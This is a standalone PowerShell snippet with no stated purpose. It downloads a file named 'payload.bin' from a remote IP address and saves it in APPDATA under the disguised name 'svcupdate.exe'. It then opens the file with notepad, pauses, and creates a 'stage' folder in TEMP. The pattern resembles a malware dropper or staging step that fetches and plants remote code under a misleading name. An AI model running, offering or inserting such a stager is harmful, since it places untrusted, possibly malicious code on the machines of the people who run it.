
$RemoteUrl = "http://203.0.113.223:8080/downloads/payload.bin"; $PayloadPath = "$env:APPDATA\svcupdate.exe"; curl.exe -s -L -o $PayloadPath $RemoteUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; Start-Sleep -Seconds 2; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
